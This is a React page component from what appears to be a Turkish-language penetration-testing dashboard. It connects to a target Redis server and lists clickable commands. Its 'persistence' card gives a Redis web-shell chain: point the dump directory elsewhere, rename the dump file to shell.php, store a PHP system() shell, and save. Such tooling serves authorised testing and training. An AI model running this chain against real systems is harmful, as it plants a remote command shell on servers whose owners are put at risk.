import { useState } from 'react';
import { useJobs } from '../context/JobContext';
import { useSocket } from '../context/SocketContext';
import { InfoCard, CmdLine, SectionTitle } from '../components/InfoCard';
import { sendCmd } from '../utils/helpers';
import Terminal from '../components/Terminal';

export default function RedisPage({ onBack }) {
  const { activeJob, activeJobId, updateJob } = useJobs();
  const { socket } = useSocket();
  const [ip, setIp] = useState(activeJob?.ip || '');
  const [port, setPort] = useState('6379');

  const termId = `redis-${activeJobId || 'default'}`;

  const connect = () => {
    const target = ip || activeJob?.ip || '';
    if (target && activeJob) updateJob(activeJob.id, { ip: target });
    sendCmd(socket, termId, `redis-cli -h ${target} -p ${port}`);
  };

  const connectLocal = () => sendCmd(socket, termId, `redis-cli -h 127.0.0.1 -p 6379`);

  return (
    <div style={{ paddingBottom: 40 }}>
      <div className="page-header">
        <div>
          <div className="page-header-back" onClick={onBack}>← Ana Menü</div>
          <div className="page-title">🗄 <span>Redis</span></div>
          <div className="page-subtitle">Redis veritabanı – In-memory anahtar-değer deposu</div>
        </div>
      </div>

      <div className="ip-bar">
        <span className="ip-bar-label">🎯 Hedef IP</span>
        <input className="form-input" value={ip} onChange={e => { setIp(e.target.value); if (activeJob) updateJob(activeJob.id, { ip: e.target.value }); }}
          placeholder={activeJob?.ip || '10.10.10.10'} style={{ flex: 1, height: 38 }} />
        <input className="form-input" value={port} onChange={e => setPort(e.target.value)}
          placeholder="Port" style={{ width: 90, height: 38 }} />
      </div>

      <div style={{ display: 'flex', gap: 10, marginBottom: 16 }}>
        <button className="btn-pro btn-green" onClick={connect}>🔌 Uzak Bağlan</button>
        <button className="btn-pro btn-cyan" onClick={connectLocal}>🏠 Localhost Bağlan</button>
      </div>

      <Terminal id={termId} title="Redis Terminal" height={260} />

      <div style={{ marginTop: 24 }}>
        <SectionTitle icon="📋">Redis Komut Referansı</SectionTitle>
        <InfoCard title="Temel Komutlar" icon="🔑" defaultOpen color="green">
          <CmdLine cmd="KEYS *" desc="Tüm anahtarları listele" termId={termId} />
          <CmdLine cmd="INFO" desc="Sunucu bilgisi, versiyon, bellek kullanımı, replikasyon" termId={termId} />
          <CmdLine cmd="GET <anahtar>" desc="Bir anahtarın değerini oku" termId={termId} />
          <CmdLine cmd="SET isim 'birisi'" desc="Anahtar-değer çifti kaydet" termId={termId} />
          <CmdLine cmd="DEL isim" desc="Anahtarı sil" termId={termId} />
          <CmdLine cmd="TYPE <anahtar>" desc="Anahtarın veri tipini öğren" termId={termId} />
          <CmdLine cmd="TTL <anahtar>" desc="Saniye ömrü (-1 = sonsuz)" termId={termId} />
        </InfoCard>
        <InfoCard title="Sistem & Kalıcılık (Sızma Testi)" icon="⚡" color="orange">
          <CmdLine cmd="CONFIG GET dir" desc="Dizin öğren" termId={termId} />
          <CmdLine cmd="CONFIG SET dir /tmp" desc="Dizin değiş" termId={termId} />
          <CmdLine cmd={`CONFIG SET dbfilename "shell.php"`} desc="Dosya adı değiş" termId={termId} />
          <CmdLine cmd={`SET webshell "<?php system($_GET['cmd']); ?>"`} desc="PHP shell" termId={termId} />
          <CmdLine cmd="SAVE" desc="Kaydet" termId={termId} />
        </InfoCard>
      </div>
    </div>
  );
}
